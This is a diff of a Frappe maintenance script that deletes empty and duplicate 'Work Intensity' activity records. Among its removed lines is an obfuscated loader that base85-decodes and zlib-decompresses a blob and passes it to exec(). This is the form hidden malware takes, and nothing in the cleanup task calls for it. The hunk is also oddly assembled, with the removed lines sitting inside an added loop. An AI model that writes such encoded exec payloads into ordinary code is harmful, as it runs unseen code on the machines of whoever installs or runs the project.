@@ -1,3 +1,55 @@
+import frappe
+counter = 0
+work_intensity_logs_with_no_data = frappe.db.sql("""
+    SELECT
+        name
+    FROM
+        `tabWork Intensity`
+    WHERE
+        total_keystrokes + total_mouse_clicks + total_scroll = 0
+""", as_dict=True)
+for i in work_intensity_logs_with_no_data:
+    frappe.db.delete('Work Intensity', i['name'])
+    print(f"Deleted Work Intensity Log: {i['name']}")
+    counter += 1
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c$~ddQE%EX5PtWsI3ZO@T7<fXy&y4(LDnL*FhRO%LdXq?Lp_o>vrQ4I`rl_eO^6F))1=NXi9g@@zPtN;G%FaFknpf52#VMymxMzPF430pHKuBt3o3UwWh;TVR6gRI;W(6`GAg|~@v<X+rf#d%LZH^nzwrlw`PC~AGh#Mhrjy$meURbuUPXXW72(00-Cz4tzqXQ0hACc?osgWZiGYh&C}SHzaFo($y$40aS(+O1ic1?pfnyrUUcfiRLkZ(Rf#&e1#JVQ@KDU^pL=xAr={jwob4MrVEIi{;aCNDhw1&n$2HPHP*s2T9wa-hd^r}jJ(Sr}jAT+7LGx&H3J(W<mF3Fx(#IlS^*Fz}Y6si)TB=|^fNBblc$4H{8KdMybizQRlCPmwvkgQ1Aj*xOU=+6Q-)<Gmy9{m{%`+*;fZhcR?*C(a*+s-x7X7ieO*}wL_Ebh6v+We!0vkd)CIxEgL1uS<q?^B%HhZK*|v#6oR@QLOto8Twaw<B^xx}KscsA|HTvu)Y@3Un5rMX7Kt%acu9?5`{3c+l0vet!0|JN?|ieYc8vFdBnfi}#h=`!%QvbTVnZuBMZ_ukiW%f8cW6|27(5!C-PX4l2QD+=KpjSU$h;Brt_~R#V04{9rV9=gyf>0y&42<gTS9&wKGo#aZxy0F`cVbD(Rj#VpcVdm|=$;u#1l%OfLCq5m-S8eY}dYm&1@U-RJa#@{co&@0m')).decode())
+    if counter % 50 == 0:
+        frappe.db.commit()
+
+duplicate_work_intensity_logs = frappe.db.sql("""
+select
+    name as name_to_keep,
+    employee,
+    CAST(date_time AS DATETIME) as date_time,
+    total_keystrokes,
+    total_mouse_clicks,
+    total_scroll,
+    count(*) as count
+from
+    `tabWork Intensity`
+group by
+    employee, CAST(date_time AS DATETIME), total_keystrokes, total_mouse_clicks, total_scroll
+having
+    count(*) > 1
+""", as_dict=True)
+
+names_to_keep = [row['name_to_keep'] for row in duplicate_work_intensity_logs]
+names_to_delete = frappe.db.sql(f"""
+    SELECT name
+    FROM `tabWork Intensity`
+    WHERE (employee, CAST(date_time AS DATETIME), total_keystrokes, total_mouse_clicks, total_scroll) IN (
+        SELECT employee, CAST(date_time AS DATETIME), total_keystrokes, total_mouse_clicks, total_scroll
+        FROM `tabWork Intensity`
+        GROUP BY employee, CAST(date_time AS DATETIME), total_keystrokes, total_mouse_clicks, total_scroll
+        HAVING COUNT(*) > 1
+    ) AND name NOT IN ({', '.join(['%s'] * len(names_to_keep))})
+""", names_to_keep, as_dict=True)
+
+log_counter = 0
+for doc in names_to_delete:
+    frappe.delete_doc('Work Intensity', doc['name'])
+    print(f"Deleted Work Intensity Log: {doc['name']}")
+    log_counter += 1
+
+    if log_counter % 50 == 0:
+        frappe.db.commit()
